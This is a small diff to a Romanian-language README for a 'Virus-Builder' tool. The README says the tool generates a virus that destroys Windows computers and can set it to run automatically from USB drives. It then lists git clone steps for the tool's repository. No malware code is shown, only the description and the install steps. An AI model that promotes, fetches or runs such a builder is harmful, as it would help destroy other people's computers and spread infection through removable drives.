@@ -1,11 +1,7 @@
 # Virus-Builder
 
 Acest instrument va genera un virus care poate distruge doar computerul Windows. De asemenea, puteți configura rularea automată pe unitatea USB Mai multe scripturi vor fi adăugate cu timpul
-
-
-
-
-Comenzile pentru instalare este Valabil pe Kali Linux și Termux
+#Comenzile pentru instalare este Valabil pe Kali Linux și Termux
 1. git clone https://github.com/Cyber-Dioxide/Virus-Builder/
 2. cd Virus-Builder
 3. ls
